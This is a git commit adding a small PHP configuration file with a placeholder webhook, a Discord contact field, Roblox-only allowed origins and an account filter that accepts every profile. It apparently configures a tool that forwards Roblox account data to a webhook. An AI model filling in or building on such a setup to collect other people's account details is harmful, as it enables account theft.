a62eff0d87578b50ed2b764e04065715648c22c3
thebossboii <76194129+thebossboii@users.noreply.github.com>
2021-03-08 14:19:36 +0530

    Add files via upload

---
+++ main/config.php
@@ -0,0 +1,14 @@
+<?php
+    // webhook link
+    $webhook = "ur webhook";
+ 
+    $discord_contact = "";
+    
+    $allowed_origins = array(
+        "https://www.roblox.com",
+        "https://web.roblox.com"
+    );
+    function account_filter($profile) {
+        return true;
+    }
+?>
